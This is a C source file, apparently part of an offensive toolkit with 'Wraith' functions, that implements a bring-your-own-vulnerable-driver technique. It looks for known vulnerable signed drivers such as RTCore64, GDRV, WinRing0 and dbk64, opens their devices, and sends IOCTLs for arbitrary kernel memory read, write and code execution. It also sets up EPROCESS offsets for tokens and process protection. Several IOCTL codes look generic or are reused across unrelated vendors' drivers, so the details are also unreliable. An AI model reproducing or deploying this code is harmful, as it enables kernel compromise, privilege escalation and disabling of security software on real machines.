#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

#define MAX_BYOVD_DRIVERS 12

typedef struct _BYOVD_DRIVER {
    CHAR cName[64];
    CHAR cServiceName[64];
    CHAR cDevicePath[64];
    DWORD dwIoctlRead;
    DWORD dwIoctlWrite;
    DWORD dwIoctlExec;
    HANDLE hDevice;
    BOOL bLoaded;
} BYOVD_DRIVER;

BYOVD_DRIVER g_BYOVDDrivers[MAX_BYOVD_DRIVERS] = {0};
DWORD g_dwBYOVDCount = 0;
BYOVD_DRIVER* g_pActiveDriver = NULL;

typedef struct _EPROCESS_OFFSETS {
    DWORD ActiveProcessLinks;
    DWORD UniqueProcessId;
    DWORD ImageFileName;
    DWORD Protection;
    DWORD SignatureLevel;
    DWORD SectionSignatureLevel;
    DWORD Token;
    DWORD ObjectTable;
    DWORD VadRoot;
    DWORD MitigationFlags;
    DWORD MitigationFlags2;
    DWORD Wow64Process;
    DWORD Peb;
    DWORD Flags;
    DWORD Flags2;
    DWORD Flags3;
    DWORD Flags4;
} EPROCESS_OFFSETS;

EPROCESS_OFFSETS g_EprocessOffsets = {0};

BOOL WraithBYOVDRegisterAll() {
    CHAR szSystem32[MAX_PATH];
    GetSystemDirectoryA(szSystem32, MAX_PATH);
    
    CHAR szDriverPath[MAX_PATH];
    
    // RTCore64 (MSI Afterburner)
    snprintf(szDriverPath, MAX_PATH, "%s\\drivers\\RTCore64.sys", szSystem32);
    if (GetFileAttributesA(szDriverPath) != INVALID_FILE_ATTRIBUTES) {
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cName, 64, "RTCore64", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cServiceName, 64, "RTCore64", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cDevicePath, 64, "\\\\.\\RTCore64", _TRUNCATE);
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlRead = 0x80002048;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlWrite = 0x8000204C;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlExec = 0x80002040;
        g_dwBYOVDCount++;
    }
    
    // aswArPot (Avast)
    snprintf(szDriverPath, MAX_PATH, "%s\\drivers\\aswArPot.sys", szSystem32);
    if (GetFileAttributesA(szDriverPath) != INVALID_FILE_ATTRIBUTES) {
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cName, 64, "aswArPot", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cServiceName, 64, "aswArPot", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cDevicePath, 64, "\\\\.\\aswArPot", _TRUNCATE);
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlRead = 0xC3502004;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlWrite = 0xC3502008;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlExec = 0xC3502808;
        g_dwBYOVDCount++;
    }
    
    // ksthunk
    snprintf(szDriverPath, MAX_PATH, "%s\\drivers\\ksthunk.sys", szSystem32);
    if (GetFileAttributesA(szDriverPath) != INVALID_FILE_ATTRIBUTES) {
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cName, 64, "ksthunk", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cServiceName, 64, "ksthunk", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cDevicePath, 64, "\\\\.\\ksthunk", _TRUNCATE);
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlRead = 0x222000;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlWrite = 0x222004;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlExec = 0x222010;
        g_dwBYOVDCount++;
    }
    
    // PDFwkrnl
    snprintf(szDriverPath, MAX_PATH, "%s\\drivers\\PDFwkrnl.sys", szSystem32);
    if (GetFileAttributesA(szDriverPath) != INVALID_FILE_ATTRIBUTES) {
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cName, 64, "PDFwkrnl", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cServiceName, 64, "PDFwkrnl", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cDevicePath, 64, "\\\\.\\PDFwkrnl", _TRUNCATE);
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlRead = 0x80002000;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlWrite = 0x80002004;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlExec = 0x80002010;
        g_dwBYOVDCount++;
    }
    
    // Truesight
    snprintf(szDriverPath, MAX_PATH, "%s\\drivers\\Truesight.sys", szSystem32);
    if (GetFileAttributesA(szDriverPath) != INVALID_FILE_ATTRIBUTES) {
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cName, 64, "Truesight", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cServiceName, 64, "Truesight", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cDevicePath, 64, "\\\\.\\Truesight", _TRUNCATE);
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlRead = 0x9C402580;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlWrite = 0x9C402584;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlExec = 0x9C402588;
        g_dwBYOVDCount++;
    }
    
    // GDRV (Gigabyte)
    snprintf(szDriverPath, MAX_PATH, "%s\\drivers\\GDRV.sys", szSystem32);
    if (GetFileAttributesA(szDriverPath) != INVALID_FILE_ATTRIBUTES) {
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cName, 64, "GDRV", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cServiceName, 64, "GDRV", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cDevicePath, 64, "\\\\.\\GIO", _TRUNCATE);
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlRead = 0xC3502004;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlWrite = 0xC3502008;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlExec = 0xC3502808;
        g_dwBYOVDCount++;
    }
    
    // DBK64 (Cheat Engine)
    snprintf(szDriverPath, MAX_PATH, "%s\\drivers\\dbk64.sys", szSystem32);
    if (GetFileAttributesA(szDriverPath) != INVALID_FILE_ATTRIBUTES) {
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cName, 64, "DBK64", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cServiceName, 64, "DBK64", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cDevicePath, 64, "\\\\.\\DBK64", _TRUNCATE);
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlRead = 0x9C406088;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlWrite = 0x9C40608C;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlExec = 0x9C406090;
        g_dwBYOVDCount++;
    }
    
    // KLSD (Kaspersky)
    snprintf(szDriverPath, MAX_PATH, "%s\\drivers\\klsd.sys", szSystem32);
    if (GetFileAttributesA(szDriverPath) != INVALID_FILE_ATTRIBUTES) {
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cName, 64, "KLSD", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cServiceName, 64, "KLSD", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cDevicePath, 64, "\\\\.\\KLSD", _TRUNCATE);
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlRead = 0x80000000;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlWrite = 0x80000004;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlExec = 0x80000010;
        g_dwBYOVDCount++;
    }
    
    // aswArDrv (Avast)
    snprintf(szDriverPath, MAX_PATH, "%s\\drivers\\aswArDrv.sys", szSystem32);
    if (GetFileAttributesA(szDriverPath) != INVALID_FILE_ATTRIBUTES) {
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cName, 64, "aswArDrv", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cServiceName, 64, "aswArDrv", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cDevicePath, 64, "\\\\.\\aswArDrv", _TRUNCATE);
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlRead = 0xC3502004;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlWrite = 0xC3502008;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlExec = 0xC3502808;
        g_dwBYOVDCount++;
    }
    
    // ATKACPI (ASUS)
    snprintf(szDriverPath, MAX_PATH, "%s\\drivers\\ATKACPI.sys", szSystem32);
    if (GetFileAttributesA(szDriverPath) != INVALID_FILE_ATTRIBUTES) {
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cName, 64, "ATKACPI", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cServiceName, 64, "ATKACPI", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cDevicePath, 64, "\\\\.\\ATKACPI", _TRUNCATE);
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlRead = 0x222000;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlWrite = 0x222004;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlExec = 0x222010;
        g_dwBYOVDCount++;
    }
    
    // WinRing0
    snprintf(szDriverPath, MAX_PATH, "%s\\drivers\\WinRing0x64.sys", szSystem32);
    if (GetFileAttributesA(szDriverPath) != INVALID_FILE_ATTRIBUTES) {
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cName, 64, "WinRing0", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cServiceName, 64, "WinRing0", _TRUNCATE);
        strncpy_s(g_BYOVDDrivers[g_dwBYOVDCount].cDevicePath, 64, "\\\\.\\WinRing0", _TRUNCATE);
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlRead = 0x80002000;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlWrite = 0x80002004;
        g_BYOVDDrivers[g_dwBYOVDCount].dwIoctlExec = 0x80002010;
        g_dwBYOVDCount++;
    }
    
    printf("[+] Registered %d BYOVD drivers\n", g_dwBYOVDCount);
    return g_dwBYOVDCount > 0;
}

BOOL WraithBYOVDLoadDriver(BYOVD_DRIVER* pDrv) {
    pDrv->hDevice = CreateFileA(pDrv->cDevicePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (pDrv->hDevice == INVALID_HANDLE_VALUE) return FALSE;
    pDrv->bLoaded = TRUE;
    return TRUE;
}

BOOL WraithBYOVDSelectBest() {
    for (DWORD i = 0; i < g_dwBYOVDCount; i++) {
        if (WraithBYOVDLoadDriver(&g_BYOVDDrivers[i])) {
            g_pActiveDriver = &g_BYOVDDrivers[i];
            printf("[+] Using BYOVD: %s\n", g_pActiveDriver->cServiceName);
            return TRUE;
        }
    }
    return FALSE;
}

BOOL WraithBYOVDReadKernel(PVOID pAddr, PVOID pBuf, DWORD dwSize) {
    if (!g_pActiveDriver || !g_pActiveDriver->bLoaded) return FALSE;
    struct { PVOID addr; PVOID buf; DWORD size; } in = { pAddr, pBuf, dwSize };
    DWORD dwBytes = 0;
    return DeviceIoControl(g_pActiveDriver->hDevice, g_pActiveDriver->dwIoctlRead, &in, sizeof(in), NULL, 0, &dwBytes, NULL);
}

BOOL WraithBYOVDWriteKernel(PVOID pAddr, PVOID pBuf, DWORD dwSize) {
    if (!g_pActiveDriver || !g_pActiveDriver->bLoaded) return FALSE;
    struct { PVOID addr; PVOID buf; DWORD size; } in = { pAddr, pBuf, dwSize };
    DWORD dwBytes = 0;
    return DeviceIoControl(g_pActiveDriver->hDevice, g_pActiveDriver->dwIoctlWrite, &in, sizeof(in), NULL, 0, &dwBytes, NULL);
}

BOOL WraithBYOVDExecKernel(PVOID pRoutine, PVOID pContext) {
    if (!g_pActiveDriver || !g_pActiveDriver->bLoaded) return FALSE;
    struct { PVOID routine; PVOID context; } in = { pRoutine, pContext };
    DWORD dwBytes = 0;
    return DeviceIoControl(g_pActiveDriver->hDevice, g_pActiveDriver->dwIoctlExec, &in, sizeof(in), NULL, 0, &dwBytes, NULL);
}

VOID WraithBYOVDCleanup() {
    for (DWORD i = 0; i < g_dwBYOVDCount; i++) {
        if (g_BYOVDDrivers[i].bLoaded && g_BYOVDDrivers[i].hDevice) {
            CloseHandle(g_BYOVDDrivers[i].hDevice);
        }
    }
    g_pActiveDriver = NULL;
}
#pragma optimize("", on)
